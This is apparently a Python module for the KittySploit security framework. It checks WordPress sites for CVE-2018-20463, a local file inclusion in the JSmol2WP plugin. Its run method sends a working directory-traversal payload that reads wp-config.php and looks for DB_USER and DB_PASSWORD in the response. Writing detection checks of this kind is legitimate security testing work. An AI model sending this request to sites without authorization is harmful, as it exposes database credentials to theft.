#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress JSmol2WP plugin 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress JSmol2WP <=1.07 - Local File Inclusion Detection',
        'description': 'WordPress JSmol2WP plugin 1.07 is susceptible to local file inclusion via ../ directory traversal in query=php://filter/resource= in the jsmol.php query string. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. This can also be exploited for server-side request forgery.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'wp', 'wp-plugin', 'wordpress', 'jsmol2wp', 'wpscan', 'traversal', 'jsmol2wp_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/9197',
            'https://wordpress.org/plugins/jsmol2wp/',
            'https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-20463',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-20463',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("'DB_USER',", "'DB_PASSWORD'",)
        header_any = ('text/plain',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WordPress JSmol2WP <=1.07 - Local File Inclusion detected",
                path='/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php',
            )
            return True
        return False

